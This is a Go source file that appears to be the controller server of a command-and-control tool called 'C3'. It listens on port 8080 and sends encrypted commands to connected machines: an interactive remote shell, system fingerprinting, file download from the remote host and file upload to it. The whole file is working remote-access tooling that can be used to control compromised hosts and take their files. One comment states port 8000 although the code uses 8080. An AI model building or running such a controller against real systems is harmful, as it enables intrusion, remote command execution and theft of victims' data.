package main

import (
	// Standard
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"strings"

	// C3
	"github.com/calebmatsick/C3/pkg/color"
	"github.com/calebmatsick/C3/pkg/security"
	"github.com/calebmatsick/C3/pkg/transfer"
)


func shell(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	shellLoop:for {
		fmt.Printf(color.Green + "[shell]: " + color.Reset)
		shellCmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		shellCmd = strings.TrimSuffix(shellCmd, "\n") 

		switch {
		case shellCmd == "":
			continue
		case shellCmd == "close":
			encShellCmd := security.Encrypt(shellCmd)
			enc.Encode(encShellCmd)
			break shellLoop
		default:
			result := ""
			encShellCmd := security.Encrypt(shellCmd)
			enc.Encode(encShellCmd)
			dec.Decode(&result)
			result = strings.TrimSuffix(result, "\n")
			fmt.Println(string(result))
		}
	}
}


func sysinfo(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	dec := gob.NewDecoder(conn)

	enc.Encode(security.Encrypt("sysinfo"))

	result := ""
	dec.Decode(&result)

	switch {
	case result == "windows":
		fmt.Println("The system is running Windows")
	case result == "darwin":
		fmt.Println("The system is running MacOS")
	case result == "linux":
		fmt.Println("The system is running Linux")	
	}
}


func exit(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	enc.Encode(security.Encrypt("exit"))
	conn.Close()
}


func download(conn net.Conn) {
	fmt.Println("Specify the path and file you would like to download")
	filePath, _ := bufio.NewReader(os.Stdin).ReadString('\n')

	enc := gob.NewEncoder(conn)
	enc.Encode(security.Encrypt("download"))
	enc.Encode(security.Encrypt(filePath))

	transfer.RecieveFile(conn)
	fmt.Println("File has been downloaded")
}


func upload(conn net.Conn) {
	enc := gob.NewEncoder(conn)
	enc.Encode(security.Encrypt("upload"))

	fmt.Println("Specify the path and file you would like to upload")
	filePath, _ := bufio.NewReader(os.Stdin).ReadString('\n')

	transfer.SendFile(conn, filePath)
	fmt.Println("File has been sent")
}


func handleConnection(conn net.Conn) {
	connLoop:for {
		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
		c3cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
		c3cmd = strings.TrimSuffix(c3cmd, "\n")

		switch {
		case c3cmd == "":
			continue connLoop
		case c3cmd == "exit":
			exit(conn)
			break connLoop
		case c3cmd == "shell":
			shell(conn)
		case c3cmd == "sysinfo":
			sysinfo(conn)
		case c3cmd == "upload":
			upload(conn)
		case c3cmd == "download":
			download(conn)
		default:
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
		}
	}

}


func main() {
	fmt.Println("Start server")

	// Listen on port 8000
	ln, err := net.Listen("tcp", ":8080")

	if err != nil {
		fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot listen on given port")
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Cannot accept connection")
		}
		go handleConnection(conn)
	}
}